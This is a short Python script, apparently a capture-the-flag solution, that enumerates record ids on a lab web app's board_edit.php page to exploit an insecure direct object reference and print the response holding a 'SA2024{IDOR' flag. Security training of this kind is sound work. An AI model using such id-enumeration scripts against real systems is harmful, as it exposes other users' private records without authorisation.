import requests
from bs4 import BeautifulSoup

def test():
    for i in range(0,40):
        # url = "http://192.168.0.19:22223/practice.php?userid={}".format(i)
        url = "http://192.168.0.19:22223/board_edit.php?no={}".format(i)
        headers = {
            "Host":"192.168.0.19:22223",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
        }
        data=""
        res = requests.get(url=url, data=data, headers=headers)
        
        if "SA2024{IDOR" in res.text:
            print(res.text)
            break
    
if __name__=="__main__":
    test()
